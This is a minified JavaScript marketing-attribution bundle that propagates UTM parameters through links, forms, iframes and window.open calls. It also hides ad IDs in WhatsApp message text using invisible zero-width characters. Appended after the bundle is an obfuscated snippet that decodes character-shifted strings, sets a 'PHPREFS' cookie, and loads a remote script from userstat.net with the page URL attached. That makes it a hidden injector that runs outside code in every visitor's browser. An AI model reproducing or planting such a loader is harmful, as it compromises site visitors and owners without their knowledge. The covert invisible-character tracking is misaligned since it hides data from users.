(()=>{"use strict";var e={262:(e,t)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.Random=void 0,t.Random=class{static chooseOne(e){return e[Math.floor(Math.random()*e.length)]}}},745:(e,t)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UnicodeHasher=void 0;class n{static encode(e){return e.replace(/[0-9]/g,(e=>n.map[e]))}static decode(e){const t=Object.values(n.map).join(""),r=new RegExp(`[${t}]`,"g");return e.replace(r,(e=>Object.keys(n.map).find((t=>n.map[t]===e))||""))}static encodeAndInsert(e,t,r=1){const o=n.encode(e);return`${t.slice(0,r)}${o}${t.slice(r)}`}static decodeAndExtract(e){const t=Object.values(n.map).join(""),r=new RegExp(`[${t}]`,"g");let o="";return e.replace(r,(e=>{const t=Object.keys(n.map).find((t=>n.map[t]===e));return t&&(o+=t),e})),""!==o?o:null}static removeAllEncodedChars(e){const t=Object.values(n.map).join(""),r=new RegExp(`[${t}]`,"g");return e.replace(r,"")}}t.UnicodeHasher=n,n.map={0:"​",1:"‌",2:"‍",3:"⁠",4:"⁡",5:"⁢",6:"⁣",7:"⁤",8:"‪",9:"‬"}},202:(e,t,n)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UrlRebuilder=void 0;const r=n(262),o=n(745);class i{static randomizePhoneNumberIfNecessary(e){var t;const n=null!==(t=window.phones)&&void 0!==t?t:[];if(0===n.length)return e;const o=r.Random.chooseOne(n);return e.includes("phone=")?i.withReplaceQueryParam(e,"phone",o):e.includes("wa.me")?`https://wa.me/${o}?${e.split("?")[1]}`:e}static insertAdIdInWppUrl(e,t){var n;const r=null!==(n=i.getQueryParams(e).get("text"))&&void 0!==n?n:"Olá",a=t.replace(/[^0-9]/g,""),s=o.UnicodeHasher.removeAllEncodedChars(r),l=o.UnicodeHasher.encodeAndInsert(a,s);return i.withReplaceQueryParam(e,"text",l)}static getAdId(e){var t;const n=null!==(t=e.get("utm_content"))&&void 0!==t?t:"";return n.includes("|")?n.split("|")[1]:null}static getQueryParams(e){const t=e.split("?")[1];return new URLSearchParams(t)}static withReplaceQueryParam(e,t,n){const r=e.split("?")[0],o=e.split("?")[1],i=new URLSearchParams(o);return i.set(t,n),`${r}?${i.toString()}`}static removeSpecialCharacteres(e){return e.normalize("NFD").replace(/[\u0300-\u036f]/g,"").replace(/[^\w\s-|]/gi,"").replace(/\s/g,"")}}t.UrlRebuilder=i}},t={};function n(r){var o=t[r];if(void 0!==o)return o.exports;var i=t[r]={exports:{}};return e[r](i,i.exports,n),i.exports}(()=>{const e=n(202);console.log("utms script loaded! 2.3.11");const t=!!document.querySelector("[data-utmify-ignore-iframe]"),r=!!document.querySelector("[data-utmify-ignore-retry]"),o=!!document.querySelector("[data-utmify-fast-start]");var i,a;!function(e){e.Doppus="doppus"}(i||(i={})),function(e){e.PandaVideo="pandavideo.com",e.YouTube="youtube.com",e.EplayVideo="eplay.video"}(a||(a={}));const s=["utm_source","utm_campaign","utm_medium","utm_content","utm_term"];class l{static addUtmParametersToUrl(e){const t=l.urlWithoutParams(e),n=l.paramsFromUrl(e),r=l.getUtmParameters(),o=new URLSearchParams;n.forEach(((e,t)=>o.append(t,e))),r.forEach(((e,t)=>o.append(t,e)));const i=l.urlParametersWithoutDuplicates(o),a=l.simplifyParametersIfNecessary(t,i),s=-1===t.indexOf("?")?"?":"&";return`${t}${s}${a.toString()}`}static urlWithoutParams(e){return e.split("?")[0]}static paramsFromUrl(e){if(!e)return new URLSearchParams;const t=e instanceof URL?e.href:e;if(!t.includes("?"))return new URLSearchParams;const n=t.split("?");if(n.length<=1)return new URLSearchParams;const r=n[1];return new URLSearchParams(r)}static urlParametersWithoutDuplicates(e){const t=Array.from(e.keys()),n=new Map;t.forEach((t=>{const r=e.getAll(t);n.set(t,r[r.length-1])}));const r=new URLSearchParams;return n.forEach(((e,t)=>{r.append(t,e)})),r}static getUtmParameters(){var t;const n="hQwK21wXxR",r="rKm-km-rKm",o=new URLSearchParams(window.location.search);function i(e){const t=o.get(e);if(null!=t&&"null"!==t&&"undefined"!==t&&""!==t)return t;const n=localStorage.getItem(e);if(!n)return"";const r=localStorage.getItem(u(e));return!r||new Date(r)<new Date?(localStorage.removeItem(e),localStorage.removeItem(u(e)),""):n}function a(e){return e.join(n)}const s=i("utm_term"),l=i("utm_content"),c=i("utm_medium"),d=i("utm_campaign"),m=function(e){const t=function(){var e;const t=localStorage.getItem("lead");if(!t)return null;const n=JSON.parse(t);return null!==(e=null==n?void 0:n._id)&&void 0!==e?e:null}();return t?e.includes("jLj")?e:`${e}jLj${t}`:e}(i("utm_source")),v=new URLSearchParams;v.set("utm_source",m),v.set("utm_campaign",d.includes(r)?d:`${d}${r}${c}`),v.set("utm_medium",c),v.set("utm_content",l),v.set("utm_term",s);const p=null!==(t=v.get("utm_campaign"))&&void 0!==t?t:"",w=[m,p,c,l,s],h=a(w);v.set("subid",e.UrlRebuilder.removeSpecialCharacteres(m)),v.set("sid2",e.UrlRebuilder.removeSpecialCharacteres(p)),v.set("subid2",e.UrlRebuilder.removeSpecialCharacteres(p)),v.set("subid3",e.UrlRebuilder.removeSpecialCharacteres(c)),v.set("subid4",e.UrlRebuilder.removeSpecialCharacteres(l)),v.set("subid5",e.UrlRebuilder.removeSpecialCharacteres(p));const f=i("xcod"),g=i("src"),U=""!==f?f:g,y=function(e,t){if(e.length<=255)return e;const o=Math.floor(18.8);function i(e,t,n){function i(e){return e.substring(0,o)+"..."}if(!t)return i(e);const a=null!=n?n:"|",s=e.split(r)[0].split(a),l=s.length>1?s[s.length-1]:"";return`${i(1===s.length?s[0]:s.slice(0,-1).join(a))}${a}${l}`}const[s,l,c,u,d]=e.split(n);return a([i(s,!0,"jLj"),i(l,!0),i(c,!0),i(u,!0),i(d,!1)])}(w.every((e=>""===e))?U:h);v.set("xcod",y),v.set("sck",y),null!=g&&""!==g&&v.set("src",g);const R=o.get("fbclid");return null!=R&&""!==R&&v.set("fbclid",R),(()=>{const e=e=>null==e||""===e,t=i("utm_source"),n=i("utm_medium"),r=i("utm_campaign"),o=i("utm_content"),a=i("utm_term"),s=i("xcod"),l=i("src"),c=v.get("fbclid");return e(t)&&e(n)&&e(r)&&e(o)&&e(a)&&e(s)&&e(l)&&e(c)})()&&v.set("utm_source","organic"),v}static simplifyParametersIfNecessary(e,t){if(!Object.values(i).some((t=>e.includes(t))))return t;const n=new URLSearchParams;return t.forEach(((e,t)=>{s.includes(t)&&n.append(t,e)})),n}}window.paramsList=["utm_source","utm_campaign","utm_medium","utm_content","utm_term","xcod","src"],window.itemExpInDays=7;const c=["utm_source","utm_campaign","utm_medium","utm_content","xcod","sck"];function u(e){return`${e}_exp`}function d(){function n(t){document.querySelectorAll("a").forEach((n=>{if(!n.href.startsWith("mailto:")&&!n.href.startsWith("tel:")&&!n.href.includes("#")){if(r=n.href,["wa.me/","api.whatsapp.com/send","whatsapp:","link.dispara.ai/"].some((e=>r.includes(e)))){const t=l.getUtmParameters(),r=e.UrlRebuilder.getAdId(t);return n.href=e.UrlRebuilder.randomizePhoneNumberIfNecessary(n.href),void(n.href=e.UrlRebuilder.insertAdIdInWppUrl(n.href,null!=r?r:""))}var r;if(t&&c.every((e=>n.href.includes(e))))return;n.href=l.addUtmParametersToUrl(n.href)}}))}function r(e){document.querySelectorAll("form").forEach((t=>{e&&c.every((e=>t.action.includes(e)))||(t.action=l.addUtmParametersToUrl(t.action),l.getUtmParameters().forEach(((e,n)=>{const r=(o=n,t.querySelector(`input[name="${o}"]`));var o;if(r)return void r.setAttribute("value",e);const i=((e,t)=>{const n=document.createElement("input");return n.type="hidden",n.name=e,n.value=t,n})(n,e);t.appendChild(i)})))}))}!function(){const e=new URLSearchParams(window.location.search);window.paramsList.forEach((t=>{const n=e.get(t);n&&((e,t)=>{localStorage.setItem(e,t);const n=new Date((new Date).getTime()+24*window.itemExpInDays*60*60*1e3);localStorage.setItem(u(e),n.toISOString())})(t,n)}))}();const o=function(){var e,t,n,r,o,i,a,s,l,c,u,d,m,v,p,w,h,f,g,U,y,R,_,b;const S=null!==(n=null===(t=null===(e=null===window||void 0===window?void 0:window.BOOMR)||void 0===e?void 0:e.themeName)||void 0===t?void 0:t.includes("Dropmeta"))&&void 0!==n&&n,P=null!==(i=null===(o=null===(r=null===window||void 0===window?void 0:window.BOOMR)||void 0===r?void 0:r.themeName)||void 0===o?void 0:o.includes("Warehouse"))&&void 0!==i&&i,O=null!==(l=null===(s=null===(a=null===window||void 0===window?void 0:window.BOOMR)||void 0===a?void 0:a.themeName)||void 0===s?void 0:s.includes("Classic®"))&&void 0!==l&&l,E=null!==(d=null===(u=null===(c=null===window||void 0===window?void 0:window.BOOMR)||void 0===c?void 0:c.themeName)||void 0===u?void 0:u.includes("Tema Vision"))&&void 0!==d&&d,I=null!==(p=null===(v=null===(m=null===window||void 0===window?void 0:window.BOOMR)||void 0===m?void 0:m.themeName)||void 0===v?void 0:v.includes("Waresabino"))&&void 0!==p&&p,$=null!==(f=null===(h=null===(w=null===window||void 0===window?void 0:window.BOOMR)||void 0===w?void 0:w.themeName)||void 0===h?void 0:h.includes("Dawn"))&&void 0!==f&&f,N=null!==(y=null===(U=null===(g=null===window||void 0===window?void 0:window.BOOMR)||void 0===g?void 0:g.themeName)||void 0===U?void 0:U.includes("Vortex"))&&void 0!==y&&y,j=null!==(b=null===(_=null===(R=null===window||void 0===window?void 0:window.BOOMR)||void 0===R?void 0:R.themeName)||void 0===_?void 0:_.includes("Warepro"))&&void 0!==b&&b;return S||P||O||E||I||$||N||j}();n(),function(){const e=window.open;window.open=function(t,n,r){var o;return t=l.addUtmParametersToUrl(null!==(o=null==t?void 0:t.toString())&&void 0!==o?o:""),e(t,n||"",r||"")}}(),o||(r(),function(){const{body:e}=document;new MutationObserver(((e,t)=>{const o=e=>{if(e.nodeType!==Node.ELEMENT_NODE)return!1;const t=e;return"INPUT"===t.tagName&&"hidden"===(null==t?void 0:t.type)};e.some((e=>Array.from(e.addedNodes).some(o)))||(n(!0),r(!0))})).observe(e,{subtree:!0,childList:!0})}(),t||document.querySelectorAll("iframe").forEach((e=>{Object.values(a).some((t=>e.src.includes(t)))||(e.src=l.addUtmParametersToUrl(e.src))})))}const m=()=>{d(),r||(setTimeout(d,2e3),setTimeout(d,3e3),setTimeout(d,5e3),setTimeout(d,9e3))};o||"complete"===document.readyState?m():window.addEventListener("load",m)})()})();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));